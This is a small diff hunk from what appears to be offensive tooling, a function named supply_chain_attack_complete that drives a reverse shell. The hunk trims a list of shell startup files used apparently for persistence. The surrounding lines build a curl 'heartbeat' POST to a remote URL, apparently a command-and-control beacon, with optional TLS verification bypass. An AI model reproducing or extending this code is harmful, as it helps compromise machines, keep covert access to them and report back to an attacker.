@@ -703,8 +703,6 @@ def supply_chain_attack_complete(shell: EnhancedReverseShell, attack_type: str =
                 "~/.bashrc",
                 "~/.profile",
                 "~/.zshrc",
-                "/etc/profile",
-                "/etc/bash.bashrc",
             ]
             curl_parts_sc = ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json", "-d", '{"command":"heartbeat"}', url]
             if shell.https_config.use_tls and not shell.https_config.verify_ssl:
